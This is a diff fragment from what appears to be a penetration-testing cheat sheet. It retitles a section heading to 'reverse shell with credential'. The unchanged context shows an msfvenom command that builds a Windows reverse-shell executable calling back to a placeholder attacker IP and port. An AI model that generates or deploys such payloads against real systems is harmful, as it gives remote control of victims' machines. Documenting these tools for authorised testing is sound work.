@@ -28,7 +28,7 @@ MSFVenom Reverse Shell Payload
 msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
 ```
 
-shell from target
+reverse shell with credential
 
 ```cmd
 REM create payload
